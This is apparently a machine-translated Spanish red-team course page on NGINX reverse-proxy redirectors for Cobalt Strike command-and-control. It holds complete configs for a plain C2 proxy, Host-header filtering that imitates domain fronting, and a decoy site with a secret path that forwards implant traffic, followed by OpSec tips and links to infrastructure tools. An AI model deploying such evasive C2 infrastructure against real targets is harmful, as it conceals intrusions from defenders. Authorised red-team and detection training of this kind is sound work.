## Ejemplo 1: Proxy inverso HTTPS básico (NGINX) para Cobalt Strike

**Objetivo:** Tráfico hacia adelante desde `https://c2.domain.com` a un servidor backend Cobalt Strike C2 a través de HTTP.

### [](https://redteamleaders.coursestack.com/courses/62c9b0f6-6a0a-488c-870b-4ca0ac754378/take/reverse-proxy-with-nginx-for-c2-#user-content-nginx-config--etcnginxsites-availablec2-redirector)**Configuración de NGINX – `/etc/nginx/sites-available/c2-redirector`**

```nginx
server {
    listen 443 ssl;
    server_name c2.domain.com;

    ssl_certificate /etc/ssl/certs/fullchain.pem;
    ssl_certificate_key /etc/ssl/private/privkey.pem;

    location / {
        proxy_pass http://<C2_SERVER_IP>:80;
        proxy_http_version 1.1;
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        proxy_set_header Upgrade $http_upgrade;
        proxy_set_header Connection "upgrade";
    }
}
```

### [](https://redteamleaders.coursestack.com/courses/62c9b0f6-6a0a-488c-870b-4ca0ac754378/take/reverse-proxy-with-nginx-for-c2-#user-content-enable-and-reload)**Habilitar y recargar**

```bash
ln -s /etc/nginx/sites-available/c2-redirector /etc/nginx/sites-enabled/
nginx -t && systemctl reload nginx
```

---

## [](https://redteamleaders.coursestack.com/courses/62c9b0f6-6a0a-488c-870b-4ca0ac754378/take/reverse-proxy-with-nginx-for-c2-#user-content-example-2-domain-fronting-style-redirect-via-host-header-filtering)Ejemplo 2: Redirección de estilo de frente de dominio (a través de `Host` filtrado de encabezado)

**Objetivo:** Acepte solo tráfico que falsifique un encabezado de host legítimo (por ejemplo, `cdn.example.com`) y avance a C2.

### [](https://redteamleaders.coursestack.com/courses/62c9b0f6-6a0a-488c-870b-4ca0ac754378/take/reverse-proxy-with-nginx-for-c2-#user-content-nginx-config-fronting-with-header-filtering)**Configuración de NGINX: frente con filtrado de encabezado**

```nginx
server {
    listen 443 ssl;
    server_name cdn.example.com;

    ssl_certificate /etc/ssl/certs/fullchain.pem;
    ssl_certificate_key /etc/ssl/private/privkey.pem;

    location / {
        if ($http_host != "cdn.example.com") {
            return 444; # drop connection silently
        }

        proxy_pass http://<C2_SERVER_IP>:80;
        proxy_http_version 1.1;
        proxy_set_header Host $http_host;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        proxy_set_header X-Real-IP $remote_addr;
    }
}
```

> Nota: Mientras esté lleno **frente de dominio** AWS y Google ya no lo admiten, esta configuración puede **emular** confiando en lo controlado `Host` cabezales de implantes o estadificación.

---

## [](https://redteamleaders.coursestack.com/courses/62c9b0f6-6a0a-488c-870b-4ca0ac754378/take/reverse-proxy-with-nginx-for-c2-#user-content-example-3-split-redirector-static--c2-routing)Ejemplo 3: Redirector dividido (enrutamiento estático + C2)

**Objetivo:** Sirva una portada señuelo para `/` y solo reenvía a C2 si el tráfico llega a una ruta secreta como `/blog-update`.

### [](https://redteamleaders.coursestack.com/courses/62c9b0f6-6a0a-488c-870b-4ca0ac754378/take/reverse-proxy-with-nginx-for-c2-#user-content-nginx-config-decoy--secret-path)**Configuración de NGINX: señuelo + ruta secreta**

```nginx
server {
    listen 443 ssl;
    server_name update.mydomain.net;

    ssl_certificate /etc/ssl/certs/fullchain.pem;
    ssl_certificate_key /etc/ssl/private/privkey.pem;

    location = / {
        root /var/www/html/;
        index index.html;
    }

    location /blog-update {
        proxy_pass http://<C2_SERVER_IP>:80;
        proxy_http_version 1.1;
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
    }
}
```

> Ahora puedes incrustar el implante para conectarlo `https://update.mydomain.net/blog-update`, mientras que los visitantes ocasionales ven una página de destino falsa estática.

---

## [](https://redteamleaders.coursestack.com/courses/62c9b0f6-6a0a-488c-870b-4ca0ac754378/take/reverse-proxy-with-nginx-for-c2-#user-content-opsec-tips-for-redirectors)Consejos de OpSec para redireccionadores

- Uso **Vamos a cifrar (certbot)** para generar certificados TLS fácilmente.
- Bloquee todos los puertos excepto 443 con `iptables` o `ufw`.
- Enable **fail2ban** para bloquear la fuerza bruta o los intentos de escaneo.
- Monitor `access.log` y `error.log` para detección.

---

## [](https://redteamleaders.coursestack.com/courses/62c9b0f6-6a0a-488c-870b-4ca0ac754378/take/reverse-proxy-with-nginx-for-c2-#user-content-testing-tools)Herramientas de prueba

- `curl -I https://yourdomain.com`— comprobar el comportamiento del encabezado
- `nmap --script http-headers -p 443 yourdomain.com`
- Wireshark + Burp Suite — analiza el comportamiento del implante frente al del navegador

---

## [](https://redteamleaders.coursestack.com/courses/62c9b0f6-6a0a-488c-870b-4ca0ac754378/take/reverse-proxy-with-nginx-for-c2-#user-content-links-with-red-team-automation-infrastructure)Vínculos con Red Team Automation Infrastructure

- [https://github.com/0xS2V2/marsform](https://github.com/0xS2V2/marsform)
- [https://github.com/ustayready/tradecraft/blob/master/offensive-security/red-team-infrastructure/automating-red-team-infrastructure-with-terraform.md](https://github.com/ustayready/tradecraft/blob/master/offensive-security/red-team-infrastructure/automating-red-team-infrastructure-with-terraform.md)
- [https://github.com/mantvydasb/Red-Team-Infrastructure-Automation](https://github.com/mantvydasb/Red-Team-Infrastructure-Automation)
- [https://github.com/RedTeamOperations/Red-Infra-Craft](https://github.com/RedTeamOperations/Red-Infra-Craft)
- [https://github.com/rebujacker/SiestaTime](https://github.com/rebujacker/SiestaTime)
- [https://github.com/b3n-j4m1n/Red-Terroir](https://github.com/b3n-j4m1n/Red-Terroir)
- [https://github.com/bluscreenofjeff/Red-Team-Infrastructure-Wiki](https://github.com/bluscreenofjeff/Red-Team-Infrastructure-Wiki)
- [https://github.com/khast3x/Redcloud](https://github.com/khast3x/Redcloud)